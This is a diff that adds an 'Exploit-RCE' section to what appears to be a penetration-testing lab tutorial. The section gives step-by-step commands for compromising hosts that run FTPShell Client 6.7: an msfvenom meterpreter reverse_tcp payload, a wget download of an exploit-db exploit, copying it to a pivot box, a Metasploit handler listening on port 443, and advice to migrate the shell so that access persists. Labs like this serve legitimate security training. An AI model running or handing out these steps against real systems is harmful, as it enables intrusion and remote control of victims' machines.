@@ -213,6 +213,62 @@ Luckily for us, when we try it on the GUI login from earlier, it does in fact wo
 
 # Exploit-RCE
 
+With our newfound access we can do more in-depth analysis of what protocols and programs are being used inside the network. Normally a firewall or NAT would prevent us from scanning a local internet from the outside but since we have access to the interal network we can gather much more information! However, it seems that after some additional scans there arent any other boxes that might be vulnerable to the drupal attack. Let's look at our localhost instead. Run the following command:
+```
+netstat -ltnup
+```
+
+
+This will display all the open sockets on our system. Are there any interesting ports open? How about port 21? That port is designated as the port for FTP, or File Transfer Protocol. You should see the PID and name of the process that is listening on port 21 at the end of our output. Now that we know we are serving data to clients maybe we can find a vulnerability that allows us to compromise their system. Let's say we analyze some traffic data and are able to determine that the hosts on this network use an ftp client called FTPShell 6.7. What can we do with that information? 
+
+
+Navigate to www.exploit-db.com and search for FTPShell Client. There are a slew of exploits for this client! Lets look at the exploit for the Client version 6.7. We can see that there is a big bytecode blob made with a tool called msfvenom that opens calc.exe on the victim. Opening calc.exe however, does not gain us additional access to the network. We want to open a shell like the one we have on the pivot box! On our Kali box, run the following command:
+```
+sudo ifconfig eth0
+```
+Then, use the IP address for inet in the LHOST parameter in the following commands:
+```
+cd ~
+msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=xxx.xxx.xxx.xxx LPORT=443 > rtcp_bytecode.txt
+```
+Alternatively, you can run the following command and it should fill in LHOST for you.
+```
+msfvenom -p windows/meterpreter/reverse_tcp -f python -b '\x00\x22\x0d\x0a\x5c\' LHOST=$(sudo ifconfig eth0 | awk '$0~/inet / {print $2}') LPORT=443 > rtcp_bytecode.txt
+```
+Now you have windows shellcode! Now we need to add it to our exploit run the following command to download the exploit:
+```
+wget https://www.exploit-db.com/raw/44596 > ftpexploit.py
+```
+Now lets replace the bytecode in the exploit with our newly generated shellcode. You can do this anyway you'd like, with a CLI or GUI text editor.
+
+With our exploit ready, lets move it to the pivot box. From the pivot box, use Secure copy (scp) to send the file over.
+```
+scp ec2-user@[your-internal-ip]:~/ftpexploit.py ./
+```
+We are now ready to launch our exploit. Before we do that however, we need to create our listener that will handle the shell we are about to open on the victim. On the Kali box, go to an available terminal and run the following commands:
+```
+sudo msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost [your internal ip]
+set lport 443
+run
+```
+It should look something like this:
+![listener.png](/img/listener.png)
+
+
+Now lets run that exploit on the pivot box. 
+```
+sudo python ftpexploit.py
+```
+![server.png](/img/server.png)
+
+Then, once the victim connects to your box you should have a meterpreter shell that looks like this!
+![meterpreter.png](/img/server.png)
+
+Now we have a fully powered meterpreter shell on the target! While not something we will cover in this demo, the very first thing we want to do is migrate our shell into another process as the FTPShell we just exploited is still open and frozen on the victim’s desktop! And everyone knows the first thing you do when something freezes is try to kill it, meaning we would lose our shell!
+
 # Surveil
 
 # Protect
